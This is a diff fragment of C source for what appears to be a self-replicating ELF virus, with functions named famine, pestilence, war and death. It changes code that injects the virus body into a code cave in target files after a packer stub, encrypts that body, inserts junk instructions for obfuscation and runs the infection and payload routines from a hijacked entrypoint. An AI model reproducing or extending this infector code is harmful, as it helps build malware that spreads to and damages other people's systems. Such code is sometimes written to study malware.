@@ -36,9 +36,6 @@
 void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
 void	jmp_end(void);
 void	entrypoint(int argc, char **argv, char **envp);
-void	encrypt(uint8_t *data, const size_t size, uint8_t *key);
-void	decrypt_self(void);
-void	real_start(void);
 void	_start(void);
 
 #define JMP_SIZE 4
@@ -87,9 +84,9 @@ static int	inject(data_t *data) {
 
 	ft_memcpy(data->file + data->cave.offset + PACKER_SIZE, (void *)(uintptr_t)&real_start, data->cave.p_size); JUNK;
 
-	crypt(data->file + data->cave.offset + PACKER_SIZE, data->cave.p_size);
+	crypt(data->file + data->cave.offset + PACKER_SIZE, data->cave.p_size, 0);
 
-	g_is_encrypted = true;
+	g_im_encrypted = true;
 
 	ft_memcpy(data->file + data->cave.offset, (void *)(uintptr_t)&_start, PACKER_SIZE); JUNK;
 
@@ -260,13 +257,10 @@ void	entrypoint(int argc, char **argv, char **envp)
 	if (pestilence() != 0) return ;
 #endif
 
+	/* vars overwritten by the injection */
 	int start_offset = g_start_offset;
-	bool is_encrypted = g_is_encrypted;
+	bool is_encrypted = g_im_encrypted;
 	
-	crypt_params_t saved;
-
-	ft_memcpy(&saved, &g_params, sizeof(crypt_params_t));
-
 	prepare_mutate();
 
 	g_envp = bootstrap_data.envp;
@@ -277,7 +271,7 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	if (war(counter, &file, start_offset) != 0) return ;
 
-	death(&saved, start_offset, &file, is_encrypted);
+	death(start_offset, &file, is_encrypted);
 
 	//if (g_start_offset == ORIG_TEXT_OFF) {
 	//	unlink(bootstrap_data.argv[0]);
